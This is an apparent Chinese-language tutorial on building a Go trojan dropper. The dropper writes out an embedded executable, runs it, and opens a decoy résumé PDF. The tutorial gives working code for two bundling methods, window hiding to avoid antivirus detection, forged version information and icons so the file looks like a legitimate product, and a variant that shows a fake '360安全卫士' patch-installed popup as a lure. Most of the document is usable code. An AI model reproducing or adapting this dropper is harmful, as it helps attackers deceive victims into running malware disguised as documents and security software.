<a name="fi0Zh"></a>
## go 捆绑
<a name="ZCfzi"></a>
### 方式一：base字节流转换
```java
package main


import (
    "encoding/base64"
    "io/ioutil"
    "strings"
	"os/exec"
    "fmt"
)

func main(){
    P2 :=""
    P1 :=""
    work :=[]string{P2,P1} //first exe, then pdf ,because the exe littler than pdf, P2 = PDF P1 = EXE
    //path :=[]string{"d:\\vscode\\go\\bypass_certutil\\1.exe","d:\\vscode\\go\\bypass_certutil\\2.pdf"}
    path :=[]string{"C:\\Users\\testgo.exe","C:\\王小明_管理部门简历.pdf"}
    for i :=0;i < 2;i++ {
        test123(work[i],path[i])
    }

    fmt.Println("end")
}
func test123(work string,path string) {
    reader := strings.NewReader(work)
    decoder := base64.NewDecoder(base64.StdEncoding, reader)
    // 以流式解码
    buf := make([]byte, 2)
    // 保存解码后的数据
    dst := ""
    for {
        n, err := decoder.Read(buf)
        if n == 0 || err != nil {
            break
        }
        dst += string(buf[:n])
    }
    err := ioutil.WriteFile(path, []byte(dst), 0666)
	if err == nil{
        Go := exec.Command("cmd","/c ",path)
        err := Go.Run()
        if err != nil {
            fmt.Println(err)
        }
        fmt.Println(path)
	}
}

```
<a name="ONX17"></a>
### 方式二：静态资源嵌入
```html
package main

import (
	_ "embed"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"syscall"
	"github.com/lxn/win"
)

//go:embed 1.exe
var b []byte
//go:embed 2.pdf
var c []byte
func main(){
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	dir,_ := os.Getwd()
	path :=[]string{"C:\\Users\\calc.exe",dir+"\\王小明_管理部门简历.pdf"}
	happy(path[0],b)
	happy(path[1],c)

}
func happy(path string,bytes []byte) {
	err := ioutil.WriteFile(path, bytes, 0666)
	if err == nil{
		Go := exec.Command("cmd","/c ",path)
		Go.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //hide the cmd
		err := Go.Run()
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(path)
	}
}
```
<a name="B27nB"></a>
## 去除黑框，规避杀软
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1647260469231-a490663e-5248-4874-8871-c79834201d93.png#clientId=u53c64f15-5c32-4&from=paste&height=329&id=ude0ea7ae&originHeight=658&originWidth=880&originalType=binary&ratio=1&rotation=0&showTitle=false&size=189950&status=done&style=none&taskId=u386748e3-acfb-42d2-a31d-27ec75130ef&title=&width=440)

calc + pdf + 无图标 + 隐藏黑框 =安全<br />calc + pdf + 有图标 + 隐藏黑框 = 杀

```java
去掉 -H=windowsgui
然后试试在代码里面实现隐藏

import "github.com/lxn/win"

//隐藏cmd窗口
win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
```
<a name="ZWzdo"></a>
## 生成图标
demo.rc内容
```java

1 VERSIONINFO
FILEVERSION 1,0,0,0
PRODUCTVERSION 1,0,0,0
FILEOS 0x40004
FILETYPE 0x1
{
BLOCK "StringFileInfo"
{
    BLOCK "040904B0"
    {
        VALUE "CompanyName", "ShanXiXiYueManCangKeJiYouXianGongSi"
        VALUE "FileDescription", "Cofox Hold Amazon Best Sellers Top100"
        VALUE "FileVersion", "1.0.0.0"
        VALUE "InternalName", "CofoxHoldAmazonTop100"
        VALUE "LegalCopyright", "Copyright (C)2019 Www.Cofox.Com. All rights reserved."
        VALUE "OriginalFilename", "CofoxAmazonBestSellersHold.exe"
        VALUE "ProductName", "CofoxHoldAmazonTop100"
        VALUE "ProductVersion", "1.0.0.0"
    }
}




BLOCK "VarFileInfo"
{
    VALUE "Translation", 0X0409, 0X04B0
}
}



IDI_ICON1 ICON "cofox.ico"


```
windres -o demo.syso demo.rc 生成的demo.syso文件<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1646667473910-025e1b0c-10b8-4c34-8467-6b72a97317db.png#clientId=u75d05b2f-2c99-4&from=paste&height=181&id=ucb2e32be&originHeight=193&originWidth=516&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13220&status=done&style=none&taskId=u7c8cea01-209b-4163-9209-0147d2f5897&title=&width=485)

demo.syso文件和go文件放到同一个文件夹下，直接go build就ok了<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1646667539875-b397646f-f19c-436b-8093-1c11d5f369f5.png#clientId=u75d05b2f-2c99-4&from=paste&height=173&id=u9713e0e7&originHeight=227&originWidth=583&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17737&status=done&style=none&taskId=u78241024-a409-49a0-85b6-afb1af3226e&title=&width=445.5)

<a name="TU8pT"></a>
## go build -ldflags "-s -w" 压缩体积编译


<a name="YjTYH"></a>
## Snipaste.exe 可以截图快速保存为ico

<a name="fdhM6"></a>
## go弹框
```html
package main

import (
	"syscall"
	"time"
	"unsafe"
)

func IntPtr(n int) uintptr {
	return uintptr(n)
}

func StrPtr(s string) uintptr {
	return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s)))
}

// windows下的另一种DLL方法调用
func ShowMessage2(title, text string) {
	user32dll, _ := syscall.LoadLibrary("user32.dll")
	user32 := syscall.NewLazyDLL("user32.dll")
	MessageBoxW := user32.NewProc("MessageBoxW")
	MessageBoxW.Call(IntPtr(0), StrPtr(text), StrPtr(title), IntPtr(0))
	defer syscall.FreeLibrary(user32dll)
}

func main() {
	go func() {
		for {
			ShowMessage2("windows下的另一种DLL方法调用", "HELLO !")
			time.Sleep(3 * time.Second)
		}
	}()
	select {}
}


```

<a name="OeYLN"></a>
## 弹框+木马
```html
package main

import (
	_ "embed"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
	"github.com/lxn/win"
)

//go:embed 2.pdf
var c []byte
func main(){
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	dir,_ := os.Getwd()
	// path :=[]string{"C:\\Users\\calc.exe",dir+"\\王小明_管理部门简历.pdf"}
	path :=dir+"\\王小明_管理部门简历.pdf"
	happy(path,c)
	time.Sleep(3 * time.Second)
	ShowMessage2("360安全卫士", "补丁安装成功,短期内电脑请勿重启！！！")
}
func happy(path string,bytes []byte) {
	err := ioutil.WriteFile(path, bytes, 0666)
	if err == nil{
		Go := exec.Command("cmd","/c ",path)
		Go.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //hide the cmd
		err := Go.Run()
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(path)
	}
}
func IntPtr(n int) uintptr {
	return uintptr(n)
}

func StrPtr(s string) uintptr {
	return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s)))
}

// windows下的另一种DLL方法调用
func ShowMessage2(title, text string) {
	user32dll, _ := syscall.LoadLibrary("user32.dll")
	user32 := syscall.NewLazyDLL("user32.dll")
	MessageBoxW := user32.NewProc("MessageBoxW")
	MessageBoxW.Call(IntPtr(0), StrPtr(text), StrPtr(title), IntPtr(0))
	defer syscall.FreeLibrary(user32dll)
}
```
